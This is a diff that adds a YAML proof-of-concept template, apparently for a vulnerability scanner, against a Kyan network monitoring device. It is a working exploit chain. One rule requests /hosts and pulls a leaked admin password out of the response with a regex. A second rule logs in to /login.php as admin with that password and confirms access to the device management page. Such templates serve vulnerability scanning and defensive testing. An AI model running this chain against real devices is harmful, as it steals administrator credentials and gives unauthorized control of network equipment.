@@ -1,0 +1,28 @@
+detail:
+  author: B1anda0(https://github.com/B1anda0)
+  links:
+  - https://mp.weixin.qq.com/s/6phWjDrGG0pCpGuCdLusIg
+expression: r0() && r1()
+manual: true
+name: poc-yaml-kyan-network-monitoring-account-password-leakage
+rules:
+  r0:
+    expression: 'true'
+    output:
+      pass: search["pass"]
+      search: '"Password=(?P<pass>.+)".bsubmatch(response.body)'
+    request:
+      cache: true
+      method: GET
+      path: /hosts
+  r1:
+    expression: "response.status == 200 && response.body.bcontains(b\"<title>\u8BBE\
+      \u5907\u7BA1\u7406\u7CFB\u7EDF</title>\") && response.body.bcontains(b\"context.php\"\
+      ) && response.body.bcontains(b\"left.php\")"
+    request:
+      body: user=admin&passwd={{pass}}
+      cache: true
+      follow_redirects: true
+      method: POST
+      path: /login.php
+transport: http
